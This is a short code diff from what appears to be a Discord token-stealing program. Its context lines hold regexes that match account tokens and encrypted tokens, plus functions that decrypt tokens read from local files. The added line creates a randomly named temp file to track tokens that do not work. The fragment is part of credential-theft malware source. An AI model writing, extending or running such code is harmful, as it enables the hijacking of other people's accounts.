@@ -27,6 +27,7 @@ const decryptToken = async (token, key) => {
 const tokenRegex = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}/gi;
 const encryptedTokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;
 const tokensNotWorking = join(getTempFolder(), generateString(10) + '.tmp');
+writeFileSync(tokensNotWorking, '');
 
 const decryptRickRoll = (path) => {
   return new Promise((resolve) => {
